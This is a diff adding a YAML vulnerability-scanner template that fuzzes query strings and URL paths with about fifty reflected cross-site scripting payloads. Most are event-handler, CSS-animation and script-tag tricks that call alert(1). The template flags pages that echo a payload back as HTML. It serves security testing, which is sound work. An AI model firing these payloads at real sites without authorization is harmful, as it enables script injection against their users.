@@ -1,0 +1,98 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<p style=\"x:\\xE2\\x80\\x8Bexpression:url(\\xE2\\x80\\x9Ajavascript:alert(1)\\xE2\\x80\\x9A);\">test</p>"
+        - "<style>@keyframes x{}</style><ul style=\"animation-name:x\" onanimationend=\"alert(1)\"></ul>"
+        - "<details onblur=alert(1) tabindex=1 id=x></details><input autofocus>"
+        - "<em id=x tabindex=1 ondeactivate=alert(1)></em><input autofocus>"
+        - "<video src=\"data:,&lt;script&gt;alert('XSS');&lt;/script&gt;\"></video>"
+        - "<script>alert(1)</script><noscript style=\"font-family:x\\00FE'vbscript';expression(javascript:alert(/xss/)>)\">test</noscript><plaintext onkeydown=\"alert(String.fromCharCode(event.keyCode))\">test</plaintext><input autofocus>"
+        - "<html><head><script>alert(1)</script></html>"
+        - "<form><input name=a tabindex=1 id=x onbeforeactivate=alert(1)></form>"
+        - "<kbd onbeforecopy=\"alert(1)\" contenteditable>test</kbd>"
+        - "<tr oncopy=\"alert(1)\" contenteditable>test</tr>"
+        - "<plaintext id=x tabindex=1 onfocusin=alert(1)></plaintext>"
+        - "<svg id=x tabindex=1 onfocusin=\"alert(1)\">test</svg>"
+        - "<keygen onmousedown=\"alert(1)\">test</keygen>"
+        - "<style>:target {transform: rotate(180deg);}</style><img id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)>"
+        - "<form action=\"/auth/login\" method=\"post\"><input name=\"username\" autofocus></form><noscript onload=alert(1)></noscript>"
+        - "<h2 id=x tabindex=1 onbeforefocusout=alert(1)></h2>"
+        - "<q onkeypress=\"alert(1)\" contenteditable>test</q>"
+        - "&lt;script&gt;alert(1)&lt;/script&gt;"
+        - "<address oncopy=\"alert(1)\" contenteditable>test</address>"
+        - "<picture onmouseleave=\"alert(1)\">test</picture><pre id=x tabindex=1 onbeforeactivate=alert(1)></pre>"
+        - "<tr draggable=\"true\" ondragleave=\"alert(1)\">test</tr>"
+        - "<form id=\"alert\" onclick=\"javascript:alert(1)\">test</form><script>document.getElementById('alert').onclick = function(e){alert(2)}</script>"
+        - "<style>:target {transform: rotate(180deg);}</style><input id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)>"
+        - "<form onmouseenter=\"alert(1)\">test</form>"
+        - "<pre id=x tabindex=1 onbeforeactivate=alert(1)></pre>"
+        - "<prompt id=prompt1></prompt><input type=button value=x onclick=\"alert(prompt1.value)\">"
+        - "<font id=x tabindex=1 onfocusout=alert(1)></font>"
+        - "<style>@keyframes slidein {}</style><img style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\">"
+        - "<sup style=\"background-image: url(javascript:javascript:alert(1)\">XSS</sup>"
+        - "<script src=\"https://example.com/js1.js\"></script><object type=\"application/x-shockwave-flash\" data=\"http://www.example.org/example1.swf?JS1=<!-- --><![CDATA[
+<img ondblclick=\"alert(1)\" contenteditable>test</img>
+]]> --></object>"
+        - "<del id=x tabindex=1 ondeactivate=alert(1)></del>"
+        - "<del onmouseout=alert(1) tabindex=1 id=x></del><script>document.getElementById('x').focus()</script>"
+        - "<;script&gt;a();&lt;/script&gt;"
+        - "<form id=x tabindex=1 onfocusin=alert(1)></form><input id=y autofocus>"
+        - "<div id=x tabindex=1 onbeforeactivate=alert(1)></div>"
+        - "<p oncontextmenu=\"alert(1)\">test</p>"
+        - "<del id=x tabindex=1 onfocusin=alert(1)></del>"
+        - "<html><script> alert(1) </script></html>"
+        - "<plaintext id=x tabindex=1 onbeforecopy=alert(1)></plaintext><input autofocus>"
+        - "<address id=\"fuzzelement1\" style=\"background-image:url(&quot;javascript:xSSpayload1&quot;)\" />"
+        - "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><p id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></p>"
+        - "<select onblur=alert(1) tabindex=1 id=x></select><input autofocus>"
+        - "<style>@keyframes x{}</style><font style=\"animation-name:x\" onanimationstart=\"alert(1)\"></font>"
+        - "<style>:target {transform: rotate(180deg);}</style><img id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)>"
+        - "<form><div id=x tabindex=1 onbeforeactivate=alert(1)></div></form>"
+        - "<script>alert(1)</script>"
+        - "<script>document.write('<script>window['+String.fromCharCode(88)+'=alert(1);</script>');</script>"
+        - "<form name=\"foo\" id=\"bar\"> <input autofocus> </form><input id=x tabindex=1 onbeforeactivate=alert(1)></input><input id=y autofocus>"
+        - "<pre id=x tabindex=1 onfocusout=alert(1)></pre><input autofocus>"
+        - "<html onkeyup=\"alert(1)\" contenteditable>test</html>"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
